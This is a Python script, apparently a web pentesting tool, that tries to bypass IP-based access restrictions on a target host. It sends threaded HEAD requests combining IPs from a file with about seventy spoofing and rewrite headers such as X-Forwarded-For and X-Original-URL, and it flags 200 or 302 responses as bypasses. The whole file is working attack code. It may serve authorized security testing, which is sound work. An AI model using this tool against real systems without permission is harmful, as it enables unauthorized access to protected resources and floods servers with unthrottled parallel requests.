# -*- coding: utf-8 -*-
import threading
import requests
from tqdm import tqdm

# Defining the Target Host
host = "https://example.com"

# Defining header variables
header_list = [
    "Access-Control-Allow-Origin", "Base-Url", "CF-Connecting-IP",
    "CF-Connecting_IP", "Client-IP", "Cluster-Client-IP",
    "Content-Length", "Destination", "From", "Http-Url",
    "Origin", "Profile", "Proxy", "Proxy-Authenticate",
    "Proxy-Authorization", "Proxy-Client-IP", "Proxy-Host",
    "Proxy-Http", "Proxy-Url", "Real-Ip", "Redirect", "Referer",
    "Referrer", "Request-Uri", "Server", "True-Client-IP", "Uri",
    "Url", "WL-Proxy-Client-IP", "x-amz-website-redirect-location",
    "X-Arbitrary", "X-Client-Ip", "X-Client-IP", "X-Custom-IP-Authorization",
    "X-Custom-IP-Authorization..;/", "x-Envoy-external-adress",
    "x-envoy-internal", "x-envoy-original-dst-host", "X-Forwarded",
    "X-Forwarded-Authorization", "X-Forwarded-By", "x-forwarded-client-cert",
    "X-Forwarded-For", "X-Forwarded-For-Original", "X-Forwarded-Host",
    "X-Forwarded-Proto", "X-Forwarded-Server", "X-Forwarder-For", "X-Forward-For",
    "X-Host", "X-Http-Destinationurl", "X-HTTP-DestinationURL", "X-Http-Host-Override",
    "X-Ip", "X-OReferrer", "X-Original-Host", "X-Originally-Forwarded-For",
    "X-Original-Remote-Addr", "X-Original-Url", "X-Original-URL", "X-Originating-",
    "X-Originating-Ip", "X-Originating-IP", "X-Proxy-Url", "X-Proxy-URL",
    "X-ProxyUser-Ip", "X-Real-Ip", "X-Remote-Addr", "X-Remote-IP",
    "X-Rewrite-Url", "X-Rewrite-URL", "X-WAP-Profile"
    ]

# Reading the IP file
with open("ips.txt", "r") as ips:
    ips_list = [line.rstrip('\n') for line in ips]

# Function that performs the test for each header and IP
def test_bypass(header, ip, pbar):
    try:
        # Displays the IP and Header being tested
        #print(f"Testing Header: {header} for IP: {ip}")
        # Carrying out the request
        response = requests.head(host, headers={header: ip}, timeout=10)
        http_code = response.status_code
        # If the status is 200 or 302, print the result
        if http_code == 200:
            print(f"[STATUS 200] Bypass for IP: {ip} and Header: {header}")
        elif http_code == 302:
            print(f"[STATUS 302] Redirect for IP: {ip} and Header: {header}")  
    except requests.RequestException as e:
        # If there is an error in the request, ignore it
        pass

    # Updates the progress bar after each test
    pbar.update(1)

# Function that creates threads to test in parallel
def start_threads():
    threads = []
    total_tests = len(header_list) * len(ips_list)
    # Progress bar
    with tqdm(total=total_tests, desc="Trying to bypass with headers and IPs") as pbar:
        # Creating threads for each IP and Header combination
        for ip in ips_list:
            for header in header_list:
                # Create a new thread for each test
                thread = threading.Thread(target=test_bypass, args=(header, ip, pbar))
                threads.append(thread)
                thread.start()
        # Wait for all threads to finish
        for thread in threads:
            thread.join()

# Main function
def main():
    print(f"[+] Testing bypass for {host}")
    start_threads()

if __name__ == "__main__":
    main()